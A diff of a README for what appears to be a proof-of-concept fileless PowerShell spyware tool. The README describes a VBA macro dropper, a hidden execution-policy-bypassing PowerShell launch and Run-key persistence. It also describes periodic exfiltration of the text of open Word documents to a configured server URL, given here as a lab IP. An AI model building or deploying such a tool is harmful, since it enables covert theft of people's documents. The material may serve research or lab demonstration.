@@ -24,17 +24,27 @@ powershell.exe -NoProfile -Noninteractive -ExecutionPolicy Bypass -WindowStyle H
 
 ### Fileless
 
-The code developed is 100% fileless as it does not require to write nothing on disk. It is loaded into memory during the login process for a user and all the operations are performed into memory.
+The code developed is 100% fileless as it does not need to write nothing on disk. It is loaded into memory during the login process for a user and all the operations are performed into memory.
 
 #### Dropper
 
-A very basic example of a VisualBasic macro has been added just to simulate a possible first step into the attack vector. This macro executes powershell loading into memory the payload from the remote server and executes it.
+A very basic example of a VisualBasic macro has been added just to simulate a possible first step into the attack vector. This macro executes a powershell instance loading into memory the payload from the remote server and executing it.
 
 ### Little privileges as possible
 
-The code does not need any special privilege, all of it can be executed into the system only with user privileges.
+The code does not need any special privilege, all used functionalities can be executed only with user privileges.
 
 ### Searches for Word processes and extracts all text written
+
+This is the core of the software and it is continuing monitoring if the process WinWord is running or not through functions `Wait-ProccessStarts` and `Wait-ProccessStops`. If it is not running the software just wait for 5 seconds and make another check. If the process is running the software call to function `Get-OpenWORDDocumentsWords` which get all open Word documents, read the words inside them and make the exfiltration executing the function `Invoke-Request`. This loop is repeated each 30 seconds while the process WinWord is running.
+
+Inside the code there are three global variables for an easy configuration of the parameters.
+
+```
+$RegistryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+$ServerURL = "http://192.168.56.1:8080"
+$Process = "Winword"
+```
 
 ### Exfiltration http server
 
